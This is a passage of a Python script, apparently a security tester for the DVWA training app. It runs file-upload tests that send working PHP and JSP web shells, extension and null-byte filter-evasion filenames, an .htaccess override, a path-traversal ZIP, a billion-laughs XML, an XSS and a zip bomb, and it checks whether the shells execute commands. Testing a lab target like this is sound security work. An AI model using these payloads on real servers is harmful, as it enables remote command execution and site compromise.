            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            resp1 = self.session.get(f"{self.base_url}/index.php", headers=headers)
            
            # Change UA and add suspicious headers
            headers = {
                "User-Agent": "sqlmap/1.6#stable",
                "X-Forwarded-For": "1.1.1.1",
                "Accept-Language": "ru-RU,ru;q=0.9"
            }
            resp2 = self.session.get(f"{self.base_url}/index.php", headers=headers)
            
            # Check if blocked
            if resp2.status_code in [403, 503]:
                self.write_log("  [✓] Request blocked after UA/geo changes")
            elif "blocked" in resp2.text.lower():
                self.write_log("  [✓] Suspicious activity detected after UA/geo changes")
            else:
                self.write_log("  [✗] No detection of UA/geo changes")
                
        except Exception as e:
            self.write_log(f"  [x] Error testing UA/geo detection: {str(e)}")


    def OTG_BUSLOGIC_008(self):
        """Test Upload of Unexpected File Types"""
        self.write_log("----- Starting OTG-BUSLOGIC-008 (Upload of Unexpected File Types) -----")
        
        upload_url = f"{self.base_url}/vulnerabilities/upload/"
        
        # List of unexpected file types to test
        test_files = [
            {
                "name": "test.html",
                "content": "<html><script>alert('XSS')</script></html>",
                "content_type": "text/html"
            },
            {
                "name": "test.php",
                "content": "<?php system($_GET['cmd']); ?>",
                "content_type": "application/x-php"
            },
            {
                "name": "test.jsp",
                "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "content_type": "text/plain"
            },
            {
                "name": "test.exe",
                "content": "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00",  # Minimal EXE header
                "content_type": "application/x-msdownload"
            },
            {
                "name": "test.htaccess",
                "content": "AddType application/x-httpd-php .jpg",
                "content_type": "text/plain"
            },
            {
                "name": "test.jpg.php",
                "content": "<?php system($_GET['cmd']); ?>",
                "content_type": "image/jpeg"
            },
            {
                "name": "test.png",
                "content": "\x89PNG\x0D\x0A\x1A\x0A",  # PNG header
                "content_type": "image/png"
            }
        ]
        
        try:
            # Get upload page to obtain CSRF token
            resp = self.session.get(upload_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find("input", {"name": "user_token"})
            token = token_input['value'] if token_input else None
            
            for test_file in test_files:
                self.write_log(f"\n[i] Testing upload of {test_file['name']} ({test_file['content_type']})")
                
                # Prepare file upload
                files = {
                    'uploaded': (test_file['name'], test_file['content'], test_file['content_type']),
                    'Upload': (None, 'Upload')
                }
                
                if token:
                    files['user_token'] = (None, token)
                
                # Submit the upload
                resp = self.session.post(upload_url, files=files)
                
                # Check response
                if "successfully uploaded" in resp.text.lower():
                    self.write_log("  [✗] Unexpected file type was accepted!")
                    
                    # Try to access the uploaded file
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    file_link = soup.find("a", href=True)
                    if file_link:
                        file_url = file_link['href']
                        if not file_url.startswith(('http://', 'https://')):
                            file_url = f"{self.base_url}{file_url}"
                        
                        access_resp = self.session.get(file_url)
                        if access_resp.status_code == 200:
                            self.write_log(f"  [✗] File is accessible at: {file_url}")
                        else:
                            self.write_log(f"  [✓] File uploaded but not accessible (HTTP {access_resp.status_code})")
                else:
                    self.write_log("  [✓] File was rejected")
                    
                # Get new token for next attempt
                soup = BeautifulSoup(resp.text, 'html.parser')
                new_token = soup.find("input", {"name": "user_token"})
                if new_token:
                    token = new_token['value']
                
                time.sleep(1)  # Small delay between tests
        
        except Exception as e:
            self.write_log(f"  [x] Error during file upload test: {str(e)}")
        
        # Test ZIP file with path traversal
        self._test_zip_path_traversal(upload_url, token)
        
        self.write_log("----- OTG-BUSLOGIC-008 Test Completed -----\n")

    def _test_zip_path_traversal(self, upload_url, token):
        """Test ZIP file containing path traversal"""
        self.write_log("\n[i] Testing ZIP file with path traversal")
        
        try:
            # Create a malicious ZIP file in memory
            from io import BytesIO
            import zipfile
            
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
                # Add a file with path traversal
                zip_file.writestr('../../malicious.php', '<?php system($_GET["cmd"]); ?>')
                zip_file.writestr('normal.txt', 'This is a normal file')
            
            # Prepare the upload
            files = {
                'uploaded': ('test.zip', zip_buffer.getvalue(), 'application/zip'),
                'Upload': (None, 'Upload')
            }
            
            if token:
                files['user_token'] = (None, token)
            
            # Submit the upload
            resp = self.session.post(upload_url, files=files)
            
            # Check response
            if "successfully uploaded" in resp.text.lower():
                self.write_log("  [✗] ZIP file with path traversal was accepted!")
                
                # Try to access the malicious file
                malicious_url = f"{self.base_url}/hackable/uploads/malicious.php"
                access_resp = self.session.get(malicious_url)
                
                if access_resp.status_code == 200:
                    self.write_log(f"  [✗] Malicious file is accessible at: {malicious_url}")
                else:
                    self.write_log(f"  [✓] Malicious file not accessible (HTTP {access_resp.status_code})")
            else:
                self.write_log("  [✓] ZIP file was rejected")
                
        except Exception as e:
            self.write_log(f"  [x] Error during ZIP file test: {str(e)}")


    def OTG_BUSLOGIC_009(self):
        """Test Upload of Malicious Files"""
        self.write_log("----- Starting OTG-BUSLOGIC-009 (Upload of Malicious Files) -----")
        
        upload_url = f"{self.base_url}/vulnerabilities/upload/"
        
        # Malicious files to test
        test_files = [
            # Web shells
            {
                "name": "shell.php",
                "content": "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>",
                "content_type": "application/x-php"
            },
            {
                "name": "shell.php5",
                "content": "<?php system($_GET['cmd']);?>",
                "content_type": "image/jpeg"
            },
            {
                "name": "shell.phtml",
                "content": "<?php echo shell_exec($_GET['cmd']);?>",
                "content_type": "text/plain"
            },
            
            # Filter evasion attempts
            {
                "name": "test.php.jpg",
                "content": "<?php system($_GET['cmd']);?>",
                "content_type": "image/jpeg"
            },
            {
                "name": "test.asp;.jpg",
                "content": "<% Response.Write('Active Server Pages') %>",
                "content_type": "image/jpeg"
            },
            {
                "name": "test.aspx\x00.jpg",
                "content": "<%@ Page Language=\"C#\"%><%Response.Write(\"ASP.NET\");%>",
                "content_type": "image/jpeg"
            },
            
            # Malicious file contents
            {
                "name": "eicar.txt",
                "content": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
                "content_type": "text/plain"
            },
            {
                "name": "malicious.html",
                "content": "<script>alert(document.cookie)</script>",
                "content_type": "text/html"
            },
            {
                "name": "billion_laughs.xml",
                "content": """<?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <lolz>&lol3;</lolz>""",
                "content_type": "application/xml"
            }
        ]
        
        try:
            # Get upload page to obtain CSRF token
            resp = self.session.get(upload_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find("input", {"name": "user_token"})
            token = token_input['value'] if token_input else None
            
            # Test regular malicious files
            for test_file in test_files:
                self.write_log(f"\n[i] Testing upload of {test_file['name']} ({test_file['content_type']})")
                
                # Prepare file upload
                files = {
                    'uploaded': (test_file['name'], test_file['content'], test_file['content_type']),
                    'Upload': (None, 'Upload')
                }
                
                if token:
                    files['user_token'] = (None, token)
                
                # Submit the upload
                resp = self.session.post(upload_url, files=files)
                
                # Check response
                self._check_malicious_upload(resp, test_file['name'])
                
                # Get new token for next attempt
                soup = BeautifulSoup(resp.text, 'html.parser')
                new_token = soup.find("input", {"name": "user_token"})
                if new_token:
                    token = new_token['value']
                
                time.sleep(1)
            
            # Test ZIP archive attacks
            self._test_zip_attacks(upload_url, token)
            
        except Exception as e:
            self.write_log(f"  [x] Error during malicious file upload test: {str(e)}")
        
        self.write_log("----- OTG-BUSLOGIC-009 Test Completed -----\n")

    def _check_malicious_upload(self, response, filename):
        """Check response for successful malicious file upload"""
        if "successfully uploaded" in response.text.lower():
            self.write_log("  [✗] Malicious file was accepted!")
            
            # Try to find and access the uploaded file
            soup = BeautifulSoup(response.text, 'html.parser')
            file_link = soup.find("a", href=True)
            if file_link:
                file_url = file_link['href']
                if not file_url.startswith(('http://', 'https://')):
                    file_url = f"{self.base_url}{file_url}"
                
                # Test if file is executable
                if filename.endswith(('.php', '.phtml', '.asp', '.aspx', '.jsp')):
                    test_url = f"{file_url}?cmd=echo+OTG_TEST"
                    test_resp = self.session.get(test_url)
                    
                    if "OTG_TEST" in test_resp.text:
                        self.write_log(f"  [✗✗] Web shell ACTIVE at: {test_url}")
                    else:
                        self.write_log(f"  [✗] File uploaded but not executable: {file_url}")
                else:
                    access_resp = self.session.get(file_url)
                    if access_resp.status_code == 200:
                        self.write_log(f"  [✗] Malicious file accessible at: {file_url}")
                    else:
                        self.write_log(f"  [✓] File uploaded but not accessible (HTTP {access_resp.status_code})")
        else:
            self.write_log("  [✓] File was rejected")

    def _test_zip_attacks(self, upload_url, token):
        """Test ZIP file based attacks (directory traversal and zip bomb)"""
        from io import BytesIO
        import zipfile
        import zlib
        
        # Test 1: ZIP with directory traversal
        self.write_log("\n[i] Testing ZIP file with directory traversal")
        try:
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
                zip_file.writestr('../../../malicious.php', '<?php system($_GET["cmd"]); ?>')
                zip_file.writestr('normal.txt', 'This looks normal')
            
            files = {
                'uploaded': ('traversal.zip', zip_buffer.getvalue(), 'application/zip'),
                'Upload': (None, 'Upload')
            }
            if token:
                files['user_token'] = (None, token)
            
            resp = self.session.post(upload_url, files=files)
            self._check_malicious_upload(resp, 'malicious.php')
        except Exception as e:
            self.write_log(f"  [x] Error testing ZIP traversal: {str(e)}")
        
        # Test 2: Small ZIP bomb (safe for testing)
        self.write_log("\n[i] Testing small ZIP bomb (safe test)")
        try:
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
                # Create a file that compresses well (1MB -> 1KB)
                zip_file.writestr('bomb.txt', '0' * (1024 * 1024), compress_type=zipfile.ZIP_DEFLATED)
            
            files = {
                'uploaded': ('bomb.zip', zip_buffer.getvalue(), 'application/zip'),
                'Upload': (None, 'Upload')
            }
            if token:
                files['user_token'] = (None, token)
            
            resp = self.session.post(upload_url, files=files)
            
            if "successfully uploaded" in resp.text.lower():
                self.write_log("  [✗] ZIP bomb was accepted!")
            else:
                self.write_log("  [✓] ZIP bomb was rejected")
        except Exception as e:
            self.write_log(f"  [x] Error testing ZIP bomb: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='DVWA Security Tester')
    parser.add_argument('--url', default='http://localhost:8080', help='DVWA base URL')
    parser.add_argument('--username', default='admin', help='DVWA username')
    parser.add_argument('--password', default='password', help='DVWA password')
    parser.add_argument('--tests', nargs='+', 
                       choices=['ALL', 'OTG_BUSLOGIC_001', 'OTG_BUSLOGIC_002', 'OTG_BUSLOGIC_003',
                                 'OTG_BUSLOGIC_004', 'OTG_BUSLOGIC_005', 'OTG_BUSLOGIC_006',
                                 'OTG_BUSLOGIC_007', 'OTG_BUSLOGIC_008', 'OTG_BUSLOGIC_009'],
                       default=['ALL'],
                       help='Tests to run (default: ALL)')
    args = parser.parse_args()
    
    tester = DVWATester(base_url=args.url, username=args.username, password=args.password)
    
    if not tester.login():
        print("[-] Login failed. Exiting.")
        return
    
    # Determine which tests to run
    if 'ALL' in args.tests:
        tests_to_run = ['OTG_BUSLOGIC_001', 'OTG_BUSLOGIC_002', 'OTG_BUSLOGIC_003',
                        'OTG_BUSLOGIC_004', 'OTG_BUSLOGIC_005', 'OTG_BUSLOGIC_006',
                        'OTG_BUSLOGIC_007', 'OTG_BUSLOGIC_008', 'OTG_BUSLOGIC_009']
    else:
        tests_to_run = args.tests
    
    # Run the tests
    test_functions = {
        'OTG_BUSLOGIC_001': tester.OTG_BUSLOGIC_001,
        'OTG_BUSLOGIC_002': tester.OTG_BUSLOGIC_002,
        'OTG_BUSLOGIC_003': tester.OTG_BUSLOGIC_003,
        'OTG_BUSLOGIC_004': tester.OTG_BUSLOGIC_004,
        'OTG_BUSLOGIC_005': tester.OTG_BUSLOGIC_005,
        'OTG_BUSLOGIC_006': tester.OTG_BUSLOGIC_006,
        'OTG_BUSLOGIC_007': tester.OTG_BUSLOGIC_007,
        'OTG_BUSLOGIC_008': tester.OTG_BUSLOGIC_008,
        'OTG_BUSLOGIC_009': tester.OTG_BUSLOGIC_009,
    }
    
    for test in tests_to_run:
        if test in test_functions:
            print(f"\n[+] Running {test}...")
            test_functions[test]()
        else:
            print(f"[!] Unknown test: {test}")

if __name__ == "__main__":
    main()